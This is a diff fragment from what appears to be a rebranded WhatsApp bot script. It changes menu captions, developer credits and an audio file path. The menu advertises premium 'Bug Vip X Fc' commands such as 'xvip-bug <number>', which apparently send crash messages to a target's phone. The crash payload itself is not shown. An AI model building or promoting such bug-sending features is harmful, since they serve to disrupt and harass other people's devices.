 ↯ /self *<mode diri sendiri>*
 ↯ /public *<mode semua>*
 
-*\`⪻ cahnnel developer ⪼\`*
-https://whatsapp.com/channel/0029Vb5urVGEquiUZ27h4j2F
+*\`⪻ CHANNEL OF THE DEV ⪼\`*
+
 
 ❏ 𝗼𝘄𝗻 𝘀𝗰𝗿𝗶𝗽𝘁 ❏
-➢ 𝗰𝗶𝗰𝗶𝘁𝘇𝘆 𝗱𝗲𝘃
-➢ 𝗹𝘂𝗯𝘆𝘇 𝗺𝗼𝗱𝘀
-➢ 𝗹𝘂𝗺𝗻𝘇 𝘁𝘇𝘆
-➢ 𝘁𝗼𝗴𝗮𝗿 𝗼𝗳𝗳𝗰
+➢ Lazack28
+
 
 ❏ 𝘀𝗲𝗹𝗹𝗲𝗿 𝘀𝗰𝗿𝗶𝗽𝘁 ❏
-➢ 𝗿𝗶𝘇𝘇 𝗼𝗳𝗳𝗰𝗶𝗮𝗹
-➢ 𝗱𝗿𝗮𝘇𝘀𝘁𝘇𝘆 𝗼𝗳𝗳𝗰
+➢ LAZACKDEVS
+➢ LAZACK28
  `
 AndraZyy.sendMessage(from, { image: thumb, caption: whatsappmessage, mentions:[sender, officialist] }, { quoted: m })
-AndraZyy.sendMessage(m.chat, {audio: fs.readFileSync('./X Andrazyy v15/Andrazyy15 dingin.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
+AndraZyy.sendMessage(m.chat, {audio: fs.readFileSync('./assets/mtaju.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
 }
 break
 case "xvip-fc": {
-if (!isPremium) return reply(" khusus premium ")
+if (!isPremium) return reply(" premium users only ")
 officialist = `${nomerOwner}@s.whatsapp.net`
-whatsappmessage = `*\`[ 𝗔𝗚𝗟𝗘𝗥 𝗙𝗢𝗥𝗚𝗘𝗥 ]\`*
+whatsappmessage = `*\`[ LAZACK BUGS ]\`*
 ❏ 𝘂𝘀𝗲𝗿 𝗻𝗮𝗺𝗲 : *${pushname}*
-❏ 𝗯𝗼𝘁 𝗻𝗮𝗺𝗲 : 𝗮𝗴𝗹𝗲𝗿 𝗳𝗼𝗿𝗴𝗲𝗿
+❏ 𝗯𝗼𝘁 𝗻𝗮𝗺𝗲 : LAZACK ADVANCED
 ❏ 𝘃𝗲𝗿𝘀𝗶𝗼𝗻 : 15.5.0
-❏ 𝗱𝗲𝘃 : t.me/Andrazyy_Offc
+❏ 𝗱𝗲𝘃 : LAZACK28 TEAM
 ❏ 𝗺𝗼𝗱𝗲 𝗯𝗼𝘁 : *${AndraZyy.public ? "public": "self"}*
 
 ┏❐⌜ *\`𝐁𝐮𝐠 𝐕𝐢𝐩 𝐗 𝐅𝐜\`* ⌟
@@ -1557,21 +1555,19 @@ whatsappmessage = `*\`[ 𝗔𝗚𝗟𝗘𝗥 𝗙𝗢𝗥𝗚𝗘𝗥 ]\`*
 ┃ ↯ xvip-bug *<𝐧𝐮𝐦𝐛𝐞𝐫>*
 ┗════════════❐
 
-*\`⪻ cahnnel developer ⪼\`*
-https://whatsapp.com/channel/0029Vb5urVGEquiUZ27h4j2F
+*\`⪻ CHANNEL OF THE DEV ⪼\`*
+https://whatsapp.com/channel/
 
 ❏ 𝗼𝘄𝗻 𝘀𝗰𝗿𝗶𝗽𝘁 ❏
-➢ 𝗰𝗶𝗰𝗶𝘁𝘇𝘆 𝗱𝗲𝘃
-➢ 𝗹𝘂𝗯𝘆𝘇 𝗺𝗼𝗱𝘀
-➢ 𝗹𝘂𝗺𝗻𝘇 𝘁𝘇𝘆
-➢ 𝘁𝗼𝗴𝗮𝗿 𝗼𝗳𝗳𝗰
+➢ Lazack28
+
 
 ❏ 𝘀𝗲𝗹𝗹𝗲𝗿 𝘀𝗰𝗿𝗶𝗽𝘁 ❏
-➢ 𝗿𝗶𝘇𝘇 𝗼𝗳𝗳𝗰𝗶𝗮𝗹
-➢ 𝗱𝗿𝗮𝘇𝘀𝘁𝘇𝘆 𝗼𝗳𝗳𝗰
+➢ LAZACKDEVS
+➢ LAZACK28
 `
 AndraZyy.sendMessage(from, { image: thumb, caption: whatsappmessage, mentions:[sender, officialist] }, { quoted: m })
-AndraZyy.sendMessage(m.chat, {audio: fs.readFileSync('./X Andrazyy v15/Andrazyy15 dingin.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
+AndraZyy.sendMessage(m.chat, {audio: fs.readFileSync('./assets/mtaju.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
 }
 break
 
